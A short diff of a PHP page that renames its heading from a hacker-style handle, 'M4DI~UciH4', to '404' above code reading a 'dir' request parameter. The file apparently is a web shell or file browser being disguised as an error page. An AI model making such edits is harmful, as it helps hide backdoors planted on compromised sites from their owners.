@@ -115,7 +115,7 @@
 	}
 </style>
 <body>
-	<center><h1>M4DI~UciH4</h1></center>
+	<center><h1>404</h1></center>
   <div class="dir">
 	<?php  
 	if (isset($_GET['dir'])) {
